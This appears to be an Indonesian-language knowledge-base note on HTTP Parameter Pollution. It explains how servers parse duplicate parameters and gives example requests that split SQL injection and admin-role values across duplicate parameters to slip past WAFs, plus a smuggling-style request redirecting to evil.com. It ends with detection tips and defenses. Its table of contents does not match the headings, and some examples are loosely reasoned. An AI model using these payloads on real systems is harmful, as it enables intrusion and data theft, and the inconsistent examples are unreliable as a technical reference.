---
title: "HTTP Parameter Pollution — WAF Bypass via Parameter Duplication: Teknik, Bypass Server, Defense"
tags:
  - cyber-security
  - http
  - parameter-pollution
  - waf-bypass
  - web-security
  - library
aliases:
  - "HPP Complete Guide"
  - "HTTP Parameter Pollution Techniques"
created: "2026-07-28"
updated: "2026-07-28"
status: pending
cssclasses:
  - wide-table
---

> [!info] Ringkasan
> HTTP Parameter Pollution (HPP) adalah teknik memanipulasi server dengan mengirimkan parameter yang sama berkali-kali dalam satu request. Perbedaan cara parsing antar server (first vs last wins, concatenation) dapat dimanfaatkan untuk bypass WAF, mengecoh validasi input, dan melakukan parameter injection. Sering digunakan bersama request smuggling dan parameter fragmentation.

**Cross-link:** [[web-hacking-exploitation]] → [[api-security-deep-dive]] → [[waf-evasion-techniques-encyclopedia]] → [[request-smuggling-deep-dive]]

---

## Daftar Isi

- [[#1. Bagaimana HPP Bekerja]]
- [[#2. Parser Behavior per Server]]
- [[#3. HPP + WAF Bypass]]
- [[#4. Parameter Fragmentation]]
- [[#5. Detection & Tools]]
- [[#6. Defense]]

---

## 1. Bagaimana HPP Bekerja

HPP mengeksploitasi perbedaan perilaku web server ketika menerima parameter duplikat.

```http
# Parameter duplikat
GET /api/users?id=1&id=2&id=3 HTTP/1.1
```

### Server Parsing

| Server       | Behavior    | Result       |
| ------------ | ----------- | ------------ |
| Apache/PHP   | Last wins   | `id=3`       |
| ASP.NET/IIS  | Concatenate | `id=1,2,3`   |
| Tomcat/JSP   | First wins  | `id=1`       |
| Python/Flask | First wins  | `id=1`       |
| Node/Express | Array       | `id=[1,2,3]` |
| Perl/CGI     | First wins  | `id=1`       |

---

## 2. Parser Behavior per Server

### HPP untuk WAF Bypass

Jika WAF cek parameter pertama (first wins) tapi backend pakai last wins:

```http
# WAF melihat: id=1 (safe)
# Backend memproses: id=UNION SELECT... (malicious)
GET /api/search?id=1&id=UNION SELECT * FROM users
```

Jika WAF cek parameter terakhir tapi backend first wins:

```http
# WAF melihat: ...FROM users (malicious)
# Backend memproses: id=1 (safe)
# Tapi parameter ketiga bisa masuk via HPP fragmentation
```

### Concatenation Bypass

```http
# ASP.NET/IIS menggabungkan nilai dengan koma
# Payload: role=admin,role=guest
# Backend: role="admin,guest"
# Jika validasi cek "guest" → bypass, backend terima "admin,guest"

GET /api/admin?role=guest&role=admin
```

---

## 3. HPP + SQL Injection Bypass

```http
# WAF mungkin cek tiap parameter individual
# Tapi backend concatenate nilai

# WAF safe:
GET /api/users?name=admin' OR '1'='1

# HPP fragmentation — WAF cek masing-masing:
GET /api/users?name=admin&name= OR &name=1&name=1
# Jika backend concatenate: "admin OR 11"

# Lebih realistis:
GET /api/users?name=admin&name= UNION&name=SELECT&name=* FROM users
# Backend (ASP.NET): name="admin,UNION,SELECT,* FROM users"
# → SQL: WHERE name IN ('admin','UNION','SELECT','* FROM users')
```

---

## 4. Parameter Fragmentation + Smuggling

```http
POST /api/vulnerable HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 65

redirect=https://evil.com?continue=/api/continue

POST /api/continue HTTP/1.1
Host: target.com
Content-Length: 15

x=1
```

---

## 5. Detection & Tools

```bash
# Manual test — bedakan response per server
curl "http://target.com/api?id=1&id=2"
# Bandingkan response dengan id=1 saja

# Tool: ParamPamPam — detect parameter pollution
# Tool: Burp Suite — HPP extension
```

---

## 6. Defense

1. **Server-side:** Gunakan framework yang konsisten dalam parsing parameter
2. **Validasi:** Ambil parameter pertama saja, ignore sisanya
3. **WAF:** Normalisasi parameter sebelum deteksi — ambil semua nilai, cek kombinasi
4. **Backend:** Jangan concatenate parameter

**Referensi:** `/mnt/data_d/Projects/Reference/PayloadsAllTheThings/HTTP Parameter Pollution/`
